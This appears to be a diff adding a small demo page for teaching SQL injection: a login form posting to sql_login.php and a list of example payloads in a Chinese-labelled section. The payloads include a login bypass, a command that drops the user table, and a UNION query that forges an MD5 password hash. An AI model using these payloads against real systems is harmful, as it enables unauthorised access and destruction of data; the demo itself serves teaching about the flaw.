@@ -1,0 +1,28 @@
+<html>
+<head><title>SQL Injection Demo</title></head>
+ <body onload="document.getElementById('user_name').focus();" >
+ <form name="login_form" id="login_form" method="post" action="sql_login.php">
+  <table border=0 align="center" >
+   <tr>
+    <td colspan=5 align="center" ><font face="Century Schoolbook L" > Login Page </font></td>
+   </tr>
+   <tr>
+    <td> User Name:</td><td> <input type="text" size="13" id="user_name" name="user_name" value=""></td>
+   </tr>
+   <tr>
+    <td> Password: </td><td> <input type="password" size="13" id="pass_word" name="pass_word" value=""></td>
+   </tr>
+   <tr>
+    <td colspan=2 align="center"><input type="submit" value="Login"> </div></td>
+   </tr>
+  </table>
+ </form>
+ 
+ <h1>实例</h1>
+ <ul>
+	<li>' or 1=1;--</li>
+	<li>';drop table tb_user;--</li>
+	<li>用于MD5类：' UNION ALL SELECT 'laksh','202cb962ac59075b964b07152d234b70</li>
+ </ul>
+</body>
+</html>
